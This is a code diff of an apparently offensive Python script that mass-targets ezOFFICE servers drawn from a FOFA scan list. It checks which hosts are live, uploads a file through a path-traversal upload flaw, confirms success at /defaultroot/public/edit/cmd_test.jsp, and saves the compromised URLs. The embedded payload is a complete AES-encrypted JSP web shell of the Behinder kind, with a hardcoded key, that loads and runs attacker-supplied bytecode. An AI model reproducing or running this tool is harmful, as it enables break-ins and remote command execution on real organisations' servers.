@@ -33,69 +33,69 @@ pool = threading.Semaphore(64)
 
 # 檢查 URL 的函數
 
-# def check_url(url):
-#     try:
-#         response = requests.get(url, timeout=4)
-#         response.raise_for_status() # 顯示出錯誤資訊
-#         with pool:
-#             url_200.append(url)
-#     except requests.exceptions.RequestException as err:
-#         pass
+def check_url(url):
+    try:
+        response = requests.get(url, timeout=4)
+        response.raise_for_status() # 顯示出錯誤資訊
+        with pool:
+            url_200.append(url)
+    except requests.exceptions.RequestException as err:
+        pass
 
 # 存放狀態碼 200 url
 
-# url_200 = []
+url_200 = []
 
 # 判斷 url 狀態碼是否 200 
 
-# try:
-#     with open('C:\\Users\\user\\Desktop\\RedTeam\\X-Fofa\\ezOFFICE.txt','r') as file:
-#         total_lines = sum(1 for line in file) # 進度條
-#         file.seek(0)
-#         for url in tqdm(file, total=total_lines, desc="Checking URLs"):
-#             url = url.strip()
-#             check_url(url)
-# except FileNotFoundError:
-#     print("目標 target.txt 找不到")
-# except Exception as e:
-#     print(e)
+try:
+    with open('C:\\Users\\user\\Desktop\\RedTeam\\X-Fofa\\ezOFFICE.txt','r') as file:
+        total_lines = sum(1 for line in file) # 進度條
+        file.seek(0)
+        for url in tqdm(file, total=total_lines, desc="Checking URLs"):
+            url = url.strip()
+            check_url(url)
+except FileNotFoundError:
+    print("目標 target.txt 找不到")
+except Exception as e:
+    print(e)
 
 # 將 url 狀態碼 200 存成 ezOFFICE.txt_200.txt
 
-# if url_200:
-#     with open('C:\\Users\\user\\Desktop\\RedTeam\\X-Fofa\\ezOFFICE.txt_200.txt','w') as f:
-#         for result in url_200:
-#             f.write(result + '\n')
+if url_200:
+    with open('C:\\Users\\user\\Desktop\\RedTeam\\X-Fofa\\ezOFFICE.txt_200.txt','w') as f:
+        for result in url_200:
+            f.write(result + '\n')
 
 # 成功上傳放入到列表中
 
-# upload_sucess_url = []
+upload_sucess_url = []
 
-# 利用 DBSTEP 字串判斷是否上傳成功
+# 利用 111111111111111111111111111 字串判斷是否上傳成功
 
-# try:
-#     with open('C:\\Users\\user\\Desktop\\RedTeam\\X-Fofa\\upload_ezOFFICE.txt_200.txt') as file:
-#         upload_url = file.readlines()
-#         for upload_url_real in upload_url:
-#             uploadsucess_url = upload_url_real.strip()
-#             try:
-#                 r = requests.get(url=uploadsucess_url,timeout=15)
-#                 if r.status_code == 200 and 'DBSTEP' in r.text:
-#                     print(f"上傳成功，路徑: {uploadsucess_url}/defaultroot/public/edit/cmd_test.jsp")
-#                     upload_sucess_url.append(uploadsucess_url)
-#                 else:
-#                     print(f"{uploadsucess_url} not sucessful")
-#             except requests.exceptions.RequestException as e:
-#                 print(f"出現異常跳過此URL: {uploadsucess_url}")
-#                 continue
-# except:
-#     pass
+try:
+    with open('C:\\Users\\user\\Desktop\\RedTeam\\X-Fofa\\upload_ezOFFICE.txt_200.txt') as file:
+        upload_url = file.readlines()
+        for upload_url_real in upload_url:
+            uploadsucess_url = upload_url_real.strip()
+            try:
+                r = requests.get(url=uploadsucess_url,timeout=15)
+                if r.status_code == 200 and '111111111111111111111111111' in r.text:
+                    print(f"上傳成功，路徑: {uploadsucess_url}/defaultroot/public/edit/cmd_test.jsp")
+                    upload_sucess_url.append(uploadsucess_url)
+                else:
+                    print(f"{uploadsucess_url} not sucessful")
+            except requests.exceptions.RequestException as e:
+                print(f"出現異常跳過此URL: {uploadsucess_url}")
+                continue
+except:
+    pass
 
 # 將成功上傳的 url 存成 sucess_upload_ezOFFICE.txt_200.txt
 
-# with open('sucess_upload_ezOFFICE.txt_200.txt', 'w') as f:
-#     for url in upload_sucess_url:
-#         f.write(url + '\n')
+with open('sucess_upload_ezOFFICE.txt_200.txt', 'w') as f:
+    for url in upload_sucess_url:
+        f.write(url + '\n')
 
 # 執行 PoC , 將狀態碼 200 的 URL 輸入成 upload_ezOFFICE.txt_200.txt
 
@@ -125,7 +125,7 @@ isDoc=dHJ1ZQ==
 moduleType=Z292ZG9jdW1lbnQ=
 FILETYPE=Li4vLi4vcHVibGljL2VkaXQvY21kX3Rlc3QuanNw
 111111111111111111111111111111111111111111111111
-<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
+<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
 """
 
 # Payload header dir
